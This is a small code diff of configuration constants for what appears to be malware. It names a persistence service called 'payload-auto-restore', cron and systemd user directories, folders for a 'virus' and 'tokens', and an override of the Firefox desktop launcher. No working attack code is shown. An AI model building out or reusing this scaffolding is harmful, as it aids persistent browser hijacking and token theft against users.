@@ -43,13 +43,9 @@ UNIT_NAME = 'payload-auto-restore.service'
 
 UNIT_DIR = '~/.config/systemd/user'
 
-BACKUP_DIR_DEFAULT = "~/.cache/backups"
+BACKUP_DIR = "~/.cache/backups"
 
-DIR_SAVE_VIRUS = "~/.cache/tmp"
-
-DIR_TOKEN_HANDSHAKE = "~/.cache/tmp/tokens"
-
-PREFIX_DIR_PAYLOAD = ".tmp_"
+SAVE_VIRUS_DIR = "~/.cache/tmp"
 
 CRON_DIR = "~/.config/cron"
 
@@ -64,3 +60,5 @@ DESKTOP_NAME_OVERRIDE = "firefox.desktop"
 DESKTOP_DIR_OVERRIDE = "/usr/share/applications"
 
 FIREFOX_BIN = "/usr/lib/firefox/firefox"
+
+LIST_NEW_FILES = []
